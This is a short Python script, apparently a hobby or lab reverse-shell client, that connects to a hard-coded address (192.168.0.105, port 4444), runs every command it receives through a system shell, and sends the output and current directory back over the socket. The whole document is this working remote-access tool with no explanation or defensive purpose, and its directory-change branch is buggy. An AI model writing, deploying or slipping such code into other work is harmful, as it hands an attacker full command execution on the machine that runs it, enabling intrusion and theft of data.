import socket
import sys
import os
import subprocess
global host
global port
global s

host = '192.168.0.105'
port = 4444
s = socket.socket()

s.connect((host, port))

while True:
    data = s.recv(1024)

    if data[:2].decode("utf-8") == 'cd':
        os.chdir(data[:3].decode("utf-8"))

    if len(data) > 0:
        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output_byte = cmd.stdout.read()+cmd.stderr.read()

        output_str = str(output_byte, "utf-8")
        current_wd = os.getcwd() + ">"

        s.send(str.encode(output_str+current_wd))

        print(output_str)

